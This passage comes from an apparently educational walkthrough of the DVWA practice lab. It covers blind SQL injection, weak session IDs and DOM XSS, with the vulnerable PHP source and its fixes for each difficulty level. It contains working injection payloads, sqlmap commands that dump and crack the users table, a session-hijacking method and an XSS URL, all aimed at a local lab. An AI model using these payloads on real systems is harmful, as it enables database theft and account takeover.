<h4 id="5、猜解表中的字段值"><a href="#5、猜解表中的字段值" class="headerlink" title="5、猜解表中的字段值"></a>5、猜解表中的字段值</h4><ol>
<li>猜解users表中有多少条数据</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span>)&gt;<span class="number">10</span> <span class="comment">#	不存在</span></span><br><span class="line">......</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(*) from users)=5 #		存在</span></span><br></pre></td></tr></table></figure>
<p>得知users表中有5条数据</p>
<ol start="2">
<li>猜解users表中字段值的长度</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))&gt;<span class="number">10</span> <span class="comment">#	不存在</span></span><br><span class="line">......</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select user from users limit 0,1),1))=5 #		存在</span></span><br></pre></td></tr></table></figure>
<p>user表中的user字段的第一个值的长度为5</p>
<ol start="3">
<li>猜解users表中字段值</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">88</span> <span class="comment">#	不存在</span></span><br><span class="line">......</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select user from users limit 0,1),1,1))=97 #	存在</span></span><br></pre></td></tr></table></figure>
<p>得知users表中user字段的第一个值的第一个字符的ascii码为97，也就是 <code>a</code> ，以此类推可以知道users表中所有字段的所有值。</p>
<p>同样地，我们也可是使用基于时间盲注的方法进行攻击，基本的利用方法为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(length(database())&gt;10,sleep(5),1)#</span><br></pre></td></tr></table></figure>
<p>意思是如果当前数据库名字的长度大于10的话，就沉睡5秒再输出，否则就就直接输出。</p>
<p>我们可以根据返回结果的时间长短来判断正确与否，与布尔盲注大同小异。</p>
<h4 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><p>我们还能利用神器sqlmap进行全自动化注入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &#x27;http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#x27; --cookie=&#x27;PHPSESSID=v2h8j395mf266fhtrgp39sarj5; security=low&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225155815130.png" alt="image-20210225155815130"></p>
<p>检测出来存在布尔盲注和时间盲注，然后就可以查库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python .\sqlmap.py -u &#x27;http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#x27; --cookie=&#x27;PHPSESSID=v2h8j395mf266fhtrgp39sarj5; security=low&#x27; -dbs</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225160218495.png" alt="image-20210225160218495"></p>
<p>得到2个库，然后表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python .\sqlmap.py -u &#x27;http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#x27; --cookie=&#x27;PHPSESSID=v2h8j395mf266fhtrgp39sarj5; security=low&#x27; -D dvwa --tables</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225160309529.png" alt="image-20210225160309529"></p>
<p>得到2个表，然后查字段名称</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python .\sqlmap.py -u &#x27;http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#x27; --cookie=&#x27;PHPSESSID=v2h8j395mf266fhtrgp39sarj5; security=low&#x27; -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225160441363.png" alt="image-20210225160441363"></p>
<p>可见有8个字段，每个字段的类型也一目了然，最后查字段的值</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python .\sqlmap.py -u &#x27;http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#x27; --cookie=&#x27;PHPSESSID=v2h8j395mf266fhtrgp39sarj5; security=low&#x27; -D dvwa -T users --dump</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225160839481.png" alt="image-20210225160839481"></p>
<p>可见users表的所有数据被展示出来，并且通过内置的字典对md5加密后的password也解密了出来。</p>
<h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    <span class="variable">$id</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$id</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @mysqli_num_rows( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>medium难度的防御措施和普通SQL注入medium难度的防御措施相同，都是通过POST方法提交数据，然后使用<strong>mysqli_real_escape_string()**函数对特殊字符进行转义，最后在前端页面使用下拉选项的方式希望控制用户的输入。那么同样的我们也可以对其进行截包改包即可，值得说明的是，由于</strong>mysqli_real_escape_string()**函数对 <code>&#39;</code> 号进行了转义，因此我们输入库名、标名和字段名的时候用不了 <code>&#39;</code> ，可以使用16进制转换，如：<code>users进行16进制转换为0x7573657273</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="number">0x7573657273</span>)=<span class="number">8</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>


<p>同样的，我们也可以利用神器sqlmap进行注入，由于是POST提交数据，这里的方法与GET的有一点不同</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &#x27;http://127.0.0.1/vulnerabilities/sqli_blind/&#x27; --data=&#x27;id=1&amp;Submit=Submit&#x27; --cookie=&#x27;PHPSESSID=6i0aksqtatmj3o2evev1ca8j67; security=medium&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225162921323.png" alt="image-20210225162921323"></p>
<p>之后的利用方法和low难度的一样。</p>
<h3 id="High-7"><a href="#High-7" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @mysqli_num_rows( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，High难度的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。但同样可以利用 <code>#</code> 进行截断。</p>
<p>利用方法和low等级的没有区别。。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225165844343.png" alt="image-20210225165844343"></p>
<p>同样，sqlmap也能进行盲注</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &#x27;http://127.0.0.1/vulnerabilities/sqli_blind/&#x27;  --cookie=&#x27;id=1*; PHPSESSID=36ns8h56n1opudss4b5tpom151; security=high&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225205200764.png" alt="image-20210225205200764"></p>
<h3 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">            header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>impossible和普通SQL注入一样，加入了token防止CSRF攻击，对输入的id参数检查是否是数字的同时使用预编译技术将查询语句和参数分开，有效防止了sql注入，最后当查询结果只有1条的时候才输出，防止了脱库。</p>
<h2 id="Weak-Session-IDs-脆弱的Session"><a href="#Weak-Session-IDs-脆弱的Session" class="headerlink" title="Weak Session IDs 脆弱的Session"></a>Weak Session IDs 脆弱的Session</h2><h3 id="Low-8"><a href="#Low-8" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>];</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>low级别的 dvwaSession 的值每次生成就 +1 ，当last_session_id不存在时就置0，这样攻击者很容易就通过遍历 dvwaSession 的值来获取用户信息。同时这种设置会造成 dvwaSession 不唯一，容易发生冲突。</p>
<p>利用方法：这里是模拟攻击者猜中了session</p>
<p>首先我们以 1337 用户的身份登陆dvwa，截包可以发现此时的dvwaSession为5</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225212215294.png" alt="image-20210225212215294"></p>
<p>复制这一段cookie，在另一个页面以admin账号登陆dvwa，然后使用hackbar，填入复制过来的cookie，然后执行</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225212434480.png" alt="image-20210225212434480"></p>
<p>神奇的发现，此时的登陆用户换成了1337。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225212527529.png" alt="image-20210225212527529"></p>
<h3 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = time();</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225214704979.png" alt="image-20210225214704979"></p>
<p>在medium难度下使用当前时间的时间戳做为dvwaSession，这种sesssion也很容易被猜到，利用方法都是跟low难度下的一样，只要猜到了session就能够以受害者的身份登陆系统。</p>
<h3 id="High-8"><a href="#High-8" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = md5(<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie ( <span class="keyword">string</span> `<span class="variable">$name</span>` , <span class="keyword">string</span> `<span class="variable">$value</span>` = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> `<span class="variable">$expires</span>` = <span class="number">0</span> , <span class="keyword">string</span> `<span class="variable">$path</span>` = <span class="string">&quot;&quot;</span> , <span class="keyword">string</span> `<span class="variable">$domain</span>` = <span class="string">&quot;&quot;</span> , <span class="keyword">bool</span> `<span class="variable">$secure</span>` = `<span class="literal">false</span>` , <span class="keyword">bool</span> `<span class="variable">$httponly</span>` = `<span class="literal">false</span>` ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p><strong>setcookie()</strong> 定义了 Cookie，会和剩下的 HTTP 头一起发送给客户端。</p>
<p>name：Cookie 名称；value：Cookie 值；expires：Cookie 的过期时间；path：Cookie 有效的服务器路径；domain：Cookie 的有效域名/子域名。secure：设置这个 Cookie 是否仅仅通过安全的 HTTPS 连接传给客户端；httponly：设置成 **<code>true</code>**，Cookie 仅可通过 HTTP 协议访问。</p>
<p>high难度下仅仅多做了一件事，把本来+1递增的dvwaSession多了一层md5加密，同时设置了session有效时间为当前时间+3600秒，有效范围和安全性的内容。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225215848498.png" alt="image-20210225215848498"></p>
<p>我们把拿到的 <code>dvwaSession=a87ff679a2f3e71d9181a67b7542122c</code> 放到md5解密网站上查询，既能够得到结果。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225220024281.png" alt="image-20210225220024281"></p>
<h3 id="Impossible-8"><a href="#Impossible-8" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = sha1(mt_rand() . time() . <span class="string">&quot;Impossible&quot;</span>);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>sha1()</strong> ： 计算字符串的 sha1 散列值</p>
<p><strong>mt_rand()</strong> ： 生成随机数</p>
<p>impossible难度下dvwaSession的值是 <code>随机数.时间戳.&#39;impossible&#39;</code>的散射值，不存在规律，因此也无法通过遍历或者猜测进行破解。同时对setcookie()函数中的2个安全有关的属性设置为true，防止了XSS攻击。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210225220654407.png" alt="image-20210225220654407"></p>
<h2 id="XSS-DOM-DOM型跨站脚本"><a href="#XSS-DOM-DOM型跨站脚本" class="headerlink" title="XSS (DOM) DOM型跨站脚本"></a>XSS (DOM) DOM型跨站脚本</h2><h3 id="Low-9"><a href="#Low-9" class="headerlink" title="Low"></a>Low</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vulnerable_code_area&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> 		<span class="tag">&lt;<span class="name">p</span>&gt;</span>Please choose a language:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">					<span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">						<span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">						<span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml">						document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">disabled</span>=<span class="string">&#x27;disabled&#x27;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">					&#125;</span><br><span class="line">					    </span><br><span class="line"><span class="handlebars"><span class="xml">					document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">					document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">					document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">					document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>DOM XSS 是通过修改页面的 DOM 节点形成的 XSS。首先通过选择语言，然后往页面中创建了新的 DOM 节点。low级别对输入的内容没有任何检查，这里的 <code>lang</code> 变量通过 <code>document.location.href </code>来获取到，并且没有任何过滤就直接URL解码后输出在了<code>option</code>标签中，利用方法直接构造URL即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226101309862.png" alt="image-20210226101309862"></p>
